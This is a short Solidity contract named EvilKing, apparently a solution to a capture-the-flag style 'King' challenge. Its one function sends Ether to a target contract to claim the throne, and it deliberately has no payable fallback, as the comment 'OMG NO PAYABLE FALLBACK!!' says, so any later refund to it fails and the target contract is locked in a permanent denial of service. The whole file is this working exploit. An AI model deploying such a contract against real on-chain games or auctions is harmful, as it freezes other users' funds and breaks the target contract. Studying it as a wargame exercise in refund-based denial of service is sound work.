// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EvilKing {

  function becomeKing(address king) public payable {
    (bool result, bytes memory data) = king.call.value(msg.value)("");
    if(!result) revert();
  }

  // OMG NO PAYABLE FALLBACK!!
}